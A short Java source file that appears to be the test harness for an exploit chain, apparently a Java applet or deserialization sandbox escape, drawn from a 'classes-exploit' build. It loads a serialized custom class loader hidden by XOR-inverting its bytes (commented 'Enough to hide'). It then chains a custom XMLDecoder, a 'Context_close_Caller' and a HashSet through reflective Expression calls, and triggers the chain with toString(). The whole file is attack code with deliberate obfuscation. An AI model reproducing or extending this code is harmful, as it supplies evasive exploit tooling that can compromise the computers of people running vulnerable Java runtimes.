package x;

import java.beans.Expression;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;

/**
 * Just to test it.
 */
public class Main2 {

	public static void main(String[] args) throws Exception {
		
		File f = new File("build/classes-exploit/x/classes.ser");
		byte[] bytes = new byte[(int) f.length()];
		FileInputStream fin = new FileInputStream(f);
		fin.read(bytes);
		fin.close();
		for( int i=0; i<bytes.length; i++ ) {
			bytes[i] = (byte) (bytes[i] ^ 255); // "Inverse bits encryption": Enough to hide
		}
		ByteArrayInputStream bin = new ByteArrayInputStream(bytes);
		ObjectInputStream oin = new ObjectInputStream(bin);		
		EC cl = (EC) oin.readObject();
		//-------------------
		InputStream in = XAppletW.class.getResourceAsStream("input.xml");
		Object dec = new Expression(cl.getClass("x.MyXMLDecoder"),"new",new Object[] {in}).getValue();
		Object iter = new Expression(cl.getClass("x.Context_close_Caller"),"create",new Object[] {dec}).getValue();
		Object o = new Expression(cl.getClass("x.MyHashSet"),"new",new Object[] {iter}).getValue();
		o.toString();
		
	}
	
}
